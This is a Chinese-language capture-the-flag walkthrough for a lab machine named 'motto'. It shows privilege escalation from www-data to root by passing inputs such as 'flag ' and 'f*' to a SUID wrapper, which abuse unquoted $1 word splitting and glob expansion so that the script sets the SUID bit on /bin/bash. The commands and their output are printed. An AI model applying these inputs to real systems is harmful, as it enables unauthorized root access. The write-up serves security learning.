接到反弹shell后，在opt下发现具有s位的程序，并且在家目录发现备份文件
```
www-data@motto:/opt$ ls -al
total 32
drwxr-xr-x  2 root root  4096 Jul 31 08:27 .
drwxr-xr-x 19 root root  4096 Jul 31 03:46 ..
-r-xr-----  1 root root  1709 Jul 31 02:45 new.sh
-rwsr-sr-x  1 root root 16864 Jul 31 08:27 run_newsh

www-data@motto:/home/redbean/.backup$ ls -la
total 16
drwxr-xr-x 2 root    root    4096 Jul 31 08:27 .
drwxr-xr-x 3 redbean redbean 4096 Jul 31 08:29 ..
-r--r--r-- 1 root    root    1709 Jul 31 02:46 new.sh
-rw-r--r-- 1 root    root     509 Jul 31 08:27 run_newsh.c
```
查看程序逻辑可知，elf执行接受第一个参数，然后以root权限运行sh文件，并且传递参数
```
[ "$1" = "flag" ] && exit 2
[ $1 = "flag" ] && chmod +s /bin/bash
```
关键在于这两行

**1.字分割**(与bash版本有关)

**==$1会进行字分割以及文件名扩展，"$1"则不会
例如，如果我给定$1为flag （注意flag后有空格），则"$1"则为flag （空格），从而判等不成立，而$1则会因为字分割，从而导致$1=flag，$2=空格，从而判等为bash加上s位

```
www-data@motto:/opt$ ./run_newsh 'flag '

▓▒░ Loading system diagnostics ░▒▓

[INFO] Initializing environment checks:
 ● Module A status: OK (ver 2.9.432)
 ● Module B status: OK (ver 4.9.331)
 ● Module C status: OK (ver 3.2.375)
Random seed value: 10307
[INFO] Evaluating input parameters...
[INFO] Running diagnostic sequence:
 → Executing test 1 of 3
 → Executing test 2 of 3
 → Executing test 3 of 3

Waiting period: 6 seconds
>> Waiting T-6 seconds...
>> Countdown: 5
>> Waiting T-4 seconds...
>> Countdown: 3
>> Waiting T-2 seconds...
>> Countdown: 1
>> Waiting T-0 seconds...
Diagnostics complete.
Thank you for using the system monitor.
[STATS] Summary Report:
    Processes checked: 48
/opt/new.sh: line 60: bc: command not found
/opt/new.sh: line 60: echo: write error: Broken pipe
    CPU load average: 
    Uptime (hours): 72
www-data@motto:/opt$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```
可以看到bash加上了s位

**2.文件名扩展**

传入参数星号或问号作为通配符,从而"$1"判等不成立，而对于$1，则会在视作星号或问号为通配符在本级目录下查找文件，从而成功判等

```
www-data@motto:/tmp$ /opt/run_newsh 'f*'

▓▒░ Loading system diagnostics ░▒▓

[INFO] Initializing environment checks:
 ● Module A status: OK (ver 3.8.498)
 ● Module B status: OK (ver 2.11.255)
 ● Module C status: OK (ver 4.19.266)
Random seed value: 2185
[INFO] Evaluating input parameters...
[INFO] Running diagnostic sequence:
 → Executing test 1 of 3
 → Executing test 2 of 3
 → Executing test 3 of 3

Waiting period: 3 seconds
>> Countdown: 3
>> Waiting T-2 seconds...
>> Countdown: 1
>> Waiting T-0 seconds...
System stable.
Thank you for using the system monitor.
[STATS] Summary Report:
    Processes checked: 31
/opt/new.sh: line 60: bc: command not found
/opt/new.sh: line 60: echo: write error: Broken pipe
    CPU load average: 
    Uptime (hours): 56
www-data@motto:/tmp$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash

```
可以看到bash也被加上s位，进而即可提权
